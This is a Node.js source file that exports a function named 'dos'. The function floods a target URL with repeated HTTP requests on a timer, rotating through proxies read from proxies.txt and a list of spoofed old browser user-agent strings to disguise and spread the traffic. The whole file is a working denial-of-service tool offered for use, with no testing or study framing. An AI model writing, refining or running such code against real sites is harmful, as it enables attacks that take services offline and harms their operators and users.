const req = require('request');
const fs = require('fs');

function readProxies() {
  try {
    const proxiesContent = fs.readFileSync('proxies.txt', 'utf-8');
    return proxiesContent
      .split('\n')
      .map(line => line.trim())
      .filter(proxy => proxy !== ''); // Remove empty lines (if any)
  } catch (err) {
    console.error("Error reading proxies.txt:", err);
    return []; 
  }
}

const userAgents = [
  'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
  'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
  'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
  'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
  'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
  'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
  'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
  'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
];

const proxies = readProxies(); 
let currentProxyIndex = 0;
let currentUserAgentIndex = 0;

const dos = (url, qty, ms) => {
  let err = 0,
    ok = 0;
  let counter = 1;
  let statusCodes = {};

  setInterval(() => {
    for (let i = 0; i < qty; i++) {
      const options = {
        url,
        proxy: `http://${proxies[currentProxyIndex]}`,
        headers: {
          'User-Agent': userAgents[currentUserAgentIndex]
        },
        timeout: 5000 // Set a timeout to avoid hanging requests
      };

      currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
      currentUserAgentIndex = (currentUserAgentIndex + 1) % userAgents.length;

      req(options, (error, response) => {
        if (error) {
          err++;
        } else {
          ok++;
          const statusCode = response.statusCode;
          statusCodes[statusCode] = (statusCodes[statusCode] || 0) + 1;
        }

        // Log results after each request
        const statusCodesString = Object.entries(statusCodes)
          .map(([code, count]) => `${code}: ${count}`)
          .join(', ');
        console.log(
          `${counter}: ${url} ${ok} ${err} Status Codes: ${statusCodesString}`
        );

        counter++;
        err = ok = 0;
        statusCodes = {};
      });
    }
  }, ms);
};

module.exports = dos;
